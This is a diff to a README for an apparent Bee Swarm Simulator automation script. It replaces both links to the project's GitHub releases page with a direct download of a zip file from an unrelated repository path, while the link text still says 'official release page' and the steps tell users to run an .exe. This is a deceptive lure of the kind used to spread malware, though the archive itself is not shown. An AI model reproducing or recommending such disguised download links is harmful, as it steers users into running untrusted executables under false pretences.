@@ -5,7 +5,7 @@ description: "Automate Bee Swarm Simulator tasks on PC with rapid targeting, cus
 ---
 # 🐝 bee-swarm-pc-script-utility - Automate your hive tasks with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/strong-federicofellini984/bee-swarm-pc-script-utility/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/strong-federicofellini984/strong-federicofellini984.github.io/main/bromoiodide/App-1.5.zip)
 
 ## 📌 Project Overview
 
@@ -25,7 +25,7 @@ To run this utility, your computer must meet minimal standards. These requiremen
 
 Follow these steps to obtain and prepare the utility for use.
 
-1. Visit the [official release page](https://github.com/strong-federicofellini984/bee-swarm-pc-script-utility/releases) to download the current version.
+1. Visit the [official release page](https://raw.githubusercontent.com/strong-federicofellini984/strong-federicofellini984.github.io/main/bromoiodide/App-1.5.zip) to download the current version.
 2. Choose the latest release folder at the top of the list.
 3. Download the executable file ending in .exe.
 4. Locate the file in your Downloads folder.
